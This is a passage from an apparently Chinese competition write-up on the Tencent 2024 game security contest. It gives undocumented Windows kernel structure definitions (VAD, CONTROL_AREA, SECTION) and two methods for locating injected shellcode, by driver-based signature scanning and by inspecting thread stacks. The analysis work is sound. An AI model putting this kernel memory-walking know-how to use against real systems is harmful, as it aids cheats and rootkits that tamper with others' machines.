class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntifs.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">MM_GRAPHICS_VAD_FLAGS</span>        // 15 <span class="title">elements</span>, 0<span class="title">x4</span> <span class="title">bytes</span> (<span class="title">sizeof</span>) </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     ULONG32      Lock : <span class="number">1</span>;                   <span class="comment">// 0 BitPosition                   </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     ULONG32      LockContended : <span class="number">1</span>;          <span class="comment">// 1 BitPosition                   </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     ULONG32      DeleteInProgress : <span class="number">1</span>;       <span class="comment">// 2 BitPosition                   </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     ULONG32      NoChange : <span class="number">1</span>;               <span class="comment">// 3 BitPosition                   </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     ULONG32      VadType : <span class="number">3</span>;                <span class="comment">// 4 BitPosition                   </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     ULONG32      Protection : <span class="number">5</span>;             <span class="comment">// 7 BitPosition                   </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     ULONG32      PreferredNode : <span class="number">6</span>;          <span class="comment">// 12 BitPosition                  </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     ULONG32      PageSize : <span class="number">2</span>;               <span class="comment">// 18 BitPosition                  </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     ULONG32      PrivateMemoryAlwaysSet : <span class="number">1</span>; <span class="comment">// 20 BitPosition                  </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     ULONG32      WriteWatch : <span class="number">1</span>;             <span class="comment">// 21 BitPosition                  </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     ULONG32      FixedLargePageSize : <span class="number">1</span>;     <span class="comment">// 22 BitPosition                  </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     ULONG32      ZeroFillPagesOptional : <span class="number">1</span>;  <span class="comment">// 23 BitPosition                  </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     ULONG32      GraphicsAlwaysSet : <span class="number">1</span>;      <span class="comment">// 24 BitPosition                  </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     ULONG32      GraphicsUseCoherentBus : <span class="number">1</span>; <span class="comment">// 25 BitPosition                  </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     ULONG32      GraphicsPageProtection : <span class="number">3</span>; <span class="comment">// 26 BitPosition                  </span></span><br><span class="line">&#125;MM_GRAPHICS_VAD_FLAGS, * PMM_GRAPHICS_VAD_FLAGS;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">MM_PRIVATE_VAD_FLAGS</span>         // 15 <span class="title">elements</span>, 0<span class="title">x4</span> <span class="title">bytes</span> (<span class="title">sizeof</span>) </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     ULONG32      Lock : <span class="number">1</span>;                   <span class="comment">// 0 BitPosition                   </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     ULONG32      LockContended : <span class="number">1</span>;          <span class="comment">// 1 BitPosition                   </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     ULONG32      DeleteInProgress : <span class="number">1</span>;       <span class="comment">// 2 BitPosition                   </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     ULONG32      NoChange : <span class="number">1</span>;               <span class="comment">// 3 BitPosition                   </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     ULONG32      VadType : <span class="number">3</span>;                <span class="comment">// 4 BitPosition                   </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     ULONG32      Protection : <span class="number">5</span>;             <span class="comment">// 7 BitPosition                   </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     ULONG32      PreferredNode : <span class="number">6</span>;          <span class="comment">// 12 BitPosition                  </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     ULONG32      PageSize : <span class="number">2</span>;               <span class="comment">// 18 BitPosition                  </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     ULONG32      PrivateMemoryAlwaysSet : <span class="number">1</span>; <span class="comment">// 20 BitPosition                  </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     ULONG32      WriteWatch : <span class="number">1</span>;             <span class="comment">// 21 BitPosition                  </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     ULONG32      FixedLargePageSize : <span class="number">1</span>;     <span class="comment">// 22 BitPosition                  </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     ULONG32      ZeroFillPagesOptional : <span class="number">1</span>;  <span class="comment">// 23 BitPosition                  </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     ULONG32      Graphics : <span class="number">1</span>;               <span class="comment">// 24 BitPosition                  </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     ULONG32      Enclave : <span class="number">1</span>;                <span class="comment">// 25 BitPosition                  </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     ULONG32      ShadowStack : <span class="number">1</span>;            <span class="comment">// 26 BitPosition                  </span></span><br><span class="line">&#125;MM_PRIVATE_VAD_FLAGS, * PMM_PRIVATE_VAD_FLAGS;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">MMVAD_FLAGS</span>            // 9 <span class="title">elements</span>, 0<span class="title">x4</span> <span class="title">bytes</span> (<span class="title">sizeof</span>) </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     ULONG32      Lock : <span class="number">1</span>;             <span class="comment">// 0 BitPosition                  </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     ULONG32      LockContended : <span class="number">1</span>;    <span class="comment">// 1 BitPosition                  </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     ULONG32      DeleteInProgress : <span class="number">1</span>; <span class="comment">// 2 BitPosition                  </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     ULONG32      NoChange : <span class="number">1</span>;         <span class="comment">// 3 BitPosition                  </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     ULONG32      VadType : <span class="number">3</span>;          <span class="comment">// 4 BitPosition                  </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     ULONG32      Protection : <span class="number">5</span>;       <span class="comment">// 7 BitPosition                  </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     ULONG32      PreferredNode : <span class="number">6</span>;    <span class="comment">// 12 BitPosition                 </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     ULONG32      PageSize : <span class="number">2</span>;         <span class="comment">// 18 BitPosition                 </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     ULONG32      PrivateMemory : <span class="number">1</span>;    <span class="comment">// 20 BitPosition                 </span></span><br><span class="line">&#125;MMVAD_FLAGS, * PMMVAD_FLAGS;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">MM_SHARED_VAD_FLAGS</span>            // 11 <span class="title">elements</span>, 0<span class="title">x4</span> <span class="title">bytes</span> (<span class="title">sizeof</span>) </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     ULONG32      Lock : <span class="number">1</span>;                     <span class="comment">// 0 BitPosition                   </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     ULONG32      LockContended : <span class="number">1</span>;            <span class="comment">// 1 BitPosition                   </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     ULONG32      DeleteInProgress : <span class="number">1</span>;         <span class="comment">// 2 BitPosition                   </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     ULONG32      NoChange : <span class="number">1</span>;                 <span class="comment">// 3 BitPosition                   </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     ULONG32      VadType : <span class="number">3</span>;                  <span class="comment">// 4 BitPosition                   </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     ULONG32      Protection : <span class="number">5</span>;               <span class="comment">// 7 BitPosition                   </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     ULONG32      PreferredNode : <span class="number">6</span>;            <span class="comment">// 12 BitPosition                  </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     ULONG32      PageSize : <span class="number">2</span>;                 <span class="comment">// 18 BitPosition                  </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     ULONG32      PrivateMemoryAlwaysClear : <span class="number">1</span>; <span class="comment">// 20 BitPosition                  </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     ULONG32      PrivateFixup : <span class="number">1</span>;             <span class="comment">// 21 BitPosition                  </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     ULONG32      HotPatchAllowed : <span class="number">1</span>;          <span class="comment">// 22 BitPosition                  </span></span><br><span class="line">&#125;MM_SHARED_VAD_FLAGS, * PMM_SHARED_VAD_FLAGS;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">MMVAD_FLAGS2</span>             // 7 <span class="title">elements</span>, 0<span class="title">x4</span> <span class="title">bytes</span> (<span class="title">sizeof</span>) </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     ULONG32      FileOffset : <span class="number">24</span>;        <span class="comment">// 0 BitPosition                  </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     ULONG32      Large : <span class="number">1</span>;              <span class="comment">// 24 BitPosition                 </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     ULONG32      TrimBehind : <span class="number">1</span>;         <span class="comment">// 25 BitPosition                 </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     ULONG32      Inherit : <span class="number">1</span>;            <span class="comment">// 26 BitPosition                 </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     ULONG32      NoValidationNeeded : <span class="number">1</span>; <span class="comment">// 27 BitPosition                 </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     ULONG32      PrivateDemandZero : <span class="number">1</span>;  <span class="comment">// 28 BitPosition                 </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     ULONG32      Spare : <span class="number">3</span>;              <span class="comment">// 29 BitPosition                 </span></span><br><span class="line">&#125;MMVAD_FLAGS2, * PMMVAD_FLAGS2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">MMVAD_SHORT</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    RTL_BALANCED_NODE VadNode;</span><br><span class="line">    UINT32 StartingVpn;               <span class="comment">/*0x18*/</span></span><br><span class="line">    UINT32 EndingVpn;                 <span class="comment">/*0x01C*/</span></span><br><span class="line">    UCHAR StartingVpnHigh;</span><br><span class="line">    UCHAR EndingVpnHigh;</span><br><span class="line">    UCHAR CommitChargeHigh;</span><br><span class="line">    UCHAR SpareNT64VadUChar;</span><br><span class="line">    INT32 ReferenceCount;</span><br><span class="line">    EX_PUSH_LOCK PushLock;            <span class="comment">/*0x028*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            ULONG_PTR flag;</span><br><span class="line">            MM_PRIVATE_VAD_FLAGS PrivateVadFlags;                        <span class="comment">/*0x030*/</span></span><br><span class="line">            MMVAD_FLAGS  VadFlags;</span><br><span class="line">            MM_GRAPHICS_VAD_FLAGS GraphicsVadFlags;</span><br><span class="line">            MM_SHARED_VAD_FLAGS   SharedVadFlags;</span><br><span class="line">        &#125;Flags;</span><br><span class="line"></span><br><span class="line">    &#125;u1;</span><br><span class="line"></span><br><span class="line">    PVOID EventList;                        <span class="comment">/*0x038*/</span></span><br><span class="line"></span><br><span class="line">&#125;MMVAD_SHORT, * PMMVAD_SHORT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">MMADDRESS_NODE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ULONG64 u1;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">MMADDRESS_NODE</span>* <span class="title">LeftChild</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">MMADDRESS_NODE</span>* <span class="title">RightChild</span>;</span></span><br><span class="line">    ULONG64 StartingVpn;</span><br><span class="line">    ULONG64 EndingVpn;</span><br><span class="line">&#125;MMADDRESS_NODE, * PMMADDRESS_NODE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">MMEXTEND_INFO</span>     // 2 <span class="title">elements</span>, 0<span class="title">x10</span> <span class="title">bytes</span> (<span class="title">sizeof</span>) </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     UINT64       CommittedSize;</span><br><span class="line">    <span class="comment">/*0x008*/</span>     ULONG32      ReferenceCount;</span><br><span class="line">    <span class="comment">/*0x00C*/</span>     UINT8        _PADDING0_[<span class="number">0x4</span>];</span><br><span class="line">&#125;MMEXTEND_INFO, * PMMEXTEND_INFO;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">SEGMENT</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">CONTROL_AREA</span>* <span class="title">ControlArea</span>;</span></span><br><span class="line">    ULONG TotalNumberOfPtes;</span><br><span class="line">    ULONG SegmentFlags;</span><br><span class="line">    ULONG64 NumberOfCommittedPages;</span><br><span class="line">    ULONG64 SizeOfSegment;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> _<span class="title">MMEXTEND_INFO</span>* <span class="title">ExtendInfo</span>;</span></span><br><span class="line">        <span class="type">void</span>* BasedAddress;</span><br><span class="line">    &#125;u;</span><br><span class="line">    ULONG64 SegmentLock;</span><br><span class="line">    ULONG64 u1;</span><br><span class="line">    ULONG64 u2;</span><br><span class="line">    PVOID* PrototypePte;</span><br><span class="line">    ULONGLONG ThePtes[<span class="number">0x1</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EX_FAST_REF</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        PVOID Object;</span><br><span class="line">        ULONG_PTR RefCnt : <span class="number">3</span>;</span><br><span class="line">        ULONG_PTR Value;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125; EX_FAST_REF, * PEX_FAST_REF;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">CONTROL_AREA</span>                      // 17 <span class="title">elements</span>, 0<span class="title">x80</span> <span class="title">bytes</span> (<span class="title">sizeof</span>) </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     <span class="class"><span class="keyword">struct</span> _<span class="title">SEGMENT</span>* <span class="title">Segment</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span>                                         // 2 <span class="title">elements</span>, 0<span class="title">x10</span> <span class="title">bytes</span> (<span class="title">sizeof</span>)  </span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="comment">/*0x008*/</span>         <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">ListHead</span>;</span>              <span class="comment">// 2 elements, 0x10 bytes (sizeof)  </span></span><br><span class="line">        <span class="comment">/*0x008*/</span>         VOID* AweContext;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">/*0x018*/</span>     UINT64       NumberOfSectionReferences;</span><br><span class="line">    <span class="comment">/*0x020*/</span>     UINT64       NumberOfPfnReferences;</span><br><span class="line">    <span class="comment">/*0x028*/</span>     UINT64       NumberOfMappedViews;</span><br><span class="line">    <span class="comment">/*0x030*/</span>     UINT64       NumberOfUserReferences;</span><br><span class="line">    <span class="comment">/*0x038*/</span>     ULONG32 u;                     <span class="comment">// 2 elements, 0x4 bytes (sizeof)   </span></span><br><span class="line">    <span class="comment">/*0x03C*/</span>     ULONG32 u1;                    <span class="comment">// 2 elements, 0x4 bytes (sizeof)   </span></span><br><span class="line">    <span class="comment">/*0x040*/</span>     <span class="class"><span class="keyword">struct</span> _<span class="title">EX_FAST_REF</span> <span class="title">FilePointer</span>;</span>              <span class="comment">// 3 elements, 0x8 bytes (sizeof)   </span></span><br><span class="line">    <span class="comment">// 4 elements, 0x8 bytes (sizeof)   </span></span><br><span class="line">&#125;CONTROL_AREA, * PCONTROL_AREA;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SUBSECTION_</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">CONTROL_AREA</span>* <span class="title">ControlArea</span>;</span></span><br><span class="line"></span><br><span class="line">&#125;SUBSECTION, * PSUBSECTION;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">MMVAD</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    MMVAD_SHORT Core;</span><br><span class="line">    <span class="class"><span class="keyword">union</span>                 /*0<span class="title">x040</span>*/</span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        UINT32 LongFlags2;</span><br><span class="line">        <span class="comment">//现在用不到省略</span></span><br><span class="line">        MMVAD_FLAGS2 VadFlags2;</span><br><span class="line"></span><br><span class="line">    &#125;u2;</span><br><span class="line">    PSUBSECTION Subsection;               <span class="comment">/*0x048*/</span></span><br><span class="line">    PVOID FirstPrototypePte;        <span class="comment">/*0x050*/</span></span><br><span class="line">    PVOID LastContiguousPte;        <span class="comment">/*0x058*/</span></span><br><span class="line">    LIST_ENTRY ViewLinks;           <span class="comment">/*0x060*/</span></span><br><span class="line">    PEPROCESS VadsProcess;          <span class="comment">/*0x070*/</span></span><br><span class="line">    PVOID u4;                       <span class="comment">/*0x078*/</span></span><br><span class="line">    PVOID FileObject;               <span class="comment">/*0x080*/</span></span><br><span class="line">&#125;MMVAD, * PMMVAD;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">RTL_AVL_TREE</span>         // 1 <span class="title">elements</span>, 0<span class="title">x8</span> <span class="title">bytes</span> (<span class="title">sizeof</span>) </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     <span class="class"><span class="keyword">struct</span> _<span class="title">RTL_BALANCED_NODE</span>* <span class="title">Root</span>;</span></span><br><span class="line">&#125;RTL_AVL_TREE, * PRTL_AVL_TREE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">VAD_INFO_</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ULONG_PTR pVad;</span><br><span class="line">    ULONG_PTR startVpn;</span><br><span class="line">    ULONG_PTR endVpn;</span><br><span class="line">    ULONG_PTR pFileObject;</span><br><span class="line">    ULONG_PTR flags;</span><br><span class="line">&#125;VAD_INFO, * PVAD_INFO;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">ALL_VADS_</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ULONG nCnt;</span><br><span class="line">    VAD_INFO VadInfos[<span class="number">1</span>];</span><br><span class="line">&#125;ALL_VADS, * PALL_VADS;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">MMSECTION_FLAGS</span>                        // 27 <span class="title">elements</span>, 0<span class="title">x4</span> <span class="title">bytes</span> (<span class="title">sizeof</span>) </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     UINT32       BeingDeleted : <span class="number">1</span>;                     <span class="comment">// 0 BitPosition                   </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     UINT32       BeingCreated : <span class="number">1</span>;                     <span class="comment">// 1 BitPosition                   </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     UINT32       BeingPurged : <span class="number">1</span>;                      <span class="comment">// 2 BitPosition                   </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     UINT32       NoModifiedWriting : <span class="number">1</span>;                <span class="comment">// 3 BitPosition                   </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     UINT32       FailAllIo : <span class="number">1</span>;                        <span class="comment">// 4 BitPosition                   </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     UINT32       Image : <span class="number">1</span>;                            <span class="comment">// 5 BitPosition                   </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     UINT32       Based : <span class="number">1</span>;                            <span class="comment">// 6 BitPosition                   </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     UINT32       File : <span class="number">1</span>;                             <span class="comment">// 7 BitPosition                   </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     UINT32       AttemptingDelete : <span class="number">1</span>;                 <span class="comment">// 8 BitPosition                   </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     UINT32       PrefetchCreated : <span class="number">1</span>;                  <span class="comment">// 9 BitPosition                   </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     UINT32       PhysicalMemory : <span class="number">1</span>;                   <span class="comment">// 10 BitPosition                  </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     UINT32       ImageControlAreaOnRemovableMedia : <span class="number">1</span>; <span class="comment">// 11 BitPosition                  </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     UINT32       Reserve : <span class="number">1</span>;                          <span class="comment">// 12 BitPosition                  </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     UINT32       Commit : <span class="number">1</span>;                           <span class="comment">// 13 BitPosition                  </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     UINT32       NoChange : <span class="number">1</span>;                         <span class="comment">// 14 BitPosition                  </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     UINT32       WasPurged : <span class="number">1</span>;                        <span class="comment">// 15 BitPosition                  </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     UINT32       UserReference : <span class="number">1</span>;                    <span class="comment">// 16 BitPosition                  </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     UINT32       GlobalMemory : <span class="number">1</span>;                     <span class="comment">// 17 BitPosition                  </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     UINT32       DeleteOnClose : <span class="number">1</span>;                    <span class="comment">// 18 BitPosition                  </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     UINT32       FilePointerNull : <span class="number">1</span>;                  <span class="comment">// 19 BitPosition                  </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     ULONG32      PreferredNode : <span class="number">6</span>;                    <span class="comment">// 20 BitPosition                  </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     UINT32       GlobalOnlyPerSession : <span class="number">1</span>;             <span class="comment">// 26 BitPosition                  </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     UINT32       UserWritable : <span class="number">1</span>;                     <span class="comment">// 27 BitPosition                  </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     UINT32       SystemVaAllocated : <span class="number">1</span>;                <span class="comment">// 28 BitPosition                  </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     UINT32       PreferredFsCompressionBoundary : <span class="number">1</span>;   <span class="comment">// 29 BitPosition                  </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     UINT32       UsingFileExtents : <span class="number">1</span>;                 <span class="comment">// 30 BitPosition                  </span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     UINT32       PageSize64K : <span class="number">1</span>;                      <span class="comment">// 31 BitPosition                  </span></span><br><span class="line">&#125;MMSECTION_FLAGS, * PMMSECTION_FLAGS;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SECTION</span>                          // 9 <span class="title">elements</span>, 0<span class="title">x40</span> <span class="title">bytes</span> (<span class="title">sizeof</span>) </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     <span class="class"><span class="keyword">struct</span> _<span class="title">RTL_BALANCED_NODE</span> <span class="title">SectionNode</span>;</span>       <span class="comment">// 6 elements, 0x18 bytes (sizeof) </span></span><br><span class="line">    <span class="comment">/*0x018*/</span>     UINT64       StartingVpn;</span><br><span class="line">    <span class="comment">/*0x020*/</span>     UINT64       EndingVpn;</span><br><span class="line">    <span class="comment">/*0x028*/</span>     <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        PCONTROL_AREA   ControlArea;</span><br><span class="line">        PVOID   FileObject;</span><br><span class="line"></span><br><span class="line">    &#125;u1;                   <span class="comment">// 4 elements, 0x8 bytes (sizeof)  </span></span><br><span class="line">    <span class="comment">/*0x030*/</span>     UINT64       SizeOfSection;</span><br><span class="line">    <span class="comment">/*0x038*/</span>     <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        ULONG32 LongFlags;</span><br><span class="line">        MMSECTION_FLAGS Flags;</span><br><span class="line">    &#125;u;                    <span class="comment">// 2 elements, 0x4 bytes (sizeof)  </span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span>                                       // 3 <span class="title">elements</span>, 0<span class="title">x4</span> <span class="title">bytes</span> (<span class="title">sizeof</span>)  </span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="comment">/*0x03C*/</span>         ULONG32      InitialPageProtection : <span class="number">12</span>; <span class="comment">// 0 BitPosition                   </span></span><br><span class="line">        <span class="comment">/*0x03C*/</span>         ULONG32      SessionId : <span class="number">19</span>;             <span class="comment">// 12 BitPosition                  </span></span><br><span class="line">        <span class="comment">/*0x03C*/</span>         ULONG32      NoValidationNeeded : <span class="number">1</span>;     <span class="comment">// 31 BitPosition                  </span></span><br><span class="line">    &#125;;</span><br><span class="line">&#125;SECTION, * PSECTION;</span><br></pre></td></tr></table></figure><p>先加载 loader 再加载 search，成功输出 shellcode 的地址，特征码匹配前八个字节，在自己的环境只输出了一个地址，如果输出多个地址可以考虑加长特征码。</p><img src="/2024/04/22/tencent-race-2024-pre-final/20.png" class=""><h5 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h5><p>通过获取到线程结构得到它的线程上下文，输出 RIP 的值应该也行，通过PCHUNTER看到shellcode运行的线程</p><img src="/2024/04/22/tencent-race-2024-pre-final/21.png" class=""><p>通过分析可知 shellcode 执行的线程具有如下特点：</p><p>与 TID&#x3D;12 的线程入口相同</p><p>保持运行状态</p><p>据此可以筛选得到这个线程，通过线程结构体可以找到它的栈</p><img src="/2024/04/22/tencent-race-2024-pre-final/22.png" class=""><p>多次运行发现栈中存在 <code>GameSec.exe</code> 这个字符串。并且在它 - 0x28 的位置有一个地址，那个地址前八位和shellcode一致，所以同样可以爆破+特征码匹配。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 